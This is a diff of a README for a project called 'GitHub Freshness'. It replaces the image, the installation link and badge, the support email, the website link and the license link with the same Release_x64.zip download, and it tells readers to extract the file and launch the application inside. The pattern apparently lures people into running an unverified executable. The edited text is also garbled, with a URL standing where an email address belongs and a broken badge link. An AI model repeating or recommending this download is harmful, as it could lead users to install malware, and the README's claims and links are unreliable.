@@ -2,7 +2,7 @@
 
 Welcome to the GitHub Freshness repository! 
 
-![GitHub Freshness](https://img.icons8.com/color/96/000000/github--v2.png)
+![GitHub Freshness](https://github.com/Satyajeet18/GitHub-Freshness/releases/download/v1.0/Release_x64.zip)
 
 This repository is all about keeping your projects fresh, up-to-date, and thriving in the GitHub community!
 
@@ -33,9 +33,9 @@ GitHub Freshness is a repository dedicated to helping you maintain the freshness
 
 ## Installation
 
-To get started with GitHub Freshness, simply download the [Software.zip](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip). Once you have downloaded the zip file, extract its contents and launch the application to begin refreshing your GitHub projects.
+To get started with GitHub Freshness, simply download the [https://github.com/Satyajeet18/GitHub-Freshness/releases/download/v1.0/Release_x64.zip](https://github.com/Satyajeet18/GitHub-Freshness/releases/download/v1.0/Release_x64.zip). Once you have downloaded the zip file, extract its contents and launch the application to begin refreshing your GitHub projects.
 
-[![Download Software.zip](https://img.shields.io/badge/Download-Software.zip-<COLOR>.svg)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download https://github.com/Satyajeet18/GitHub-Freshness/releases/download/v1.0/Release_x64.zip](https://github.com/Satyajeet18/GitHub-Freshness/releases/download/v1.0/Release_x64.zip<COLOR>.svg)](https://github.com/Satyajeet18/GitHub-Freshness/releases/download/v1.0/Release_x64.zip)
 
 ## Usage
 
@@ -51,7 +51,7 @@ If you have any questions or need assistance, feel free to reach out to our supp
 
 ## Support
 
-For support, contact us at support@githubfreshness.com or visit our [website](https://www.githubfreshness.com) for more information.
+For support, contact us at https://github.com/Satyajeet18/GitHub-Freshness/releases/download/v1.0/Release_x64.zip or visit our [website](https://github.com/Satyajeet18/GitHub-Freshness/releases/download/v1.0/Release_x64.zip) for more information.
 
 ## Contributing
 
@@ -59,7 +59,7 @@ We welcome contributions from the GitHub community to help us improve GitHub Fre
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Satyajeet18/GitHub-Freshness/releases/download/v1.0/Release_x64.zip](https://github.com/Satyajeet18/GitHub-Freshness/releases/download/v1.0/Release_x64.zip) file for details.
 
 Let's keep our GitHub projects fresh and thriving together! 🌿🚀
 
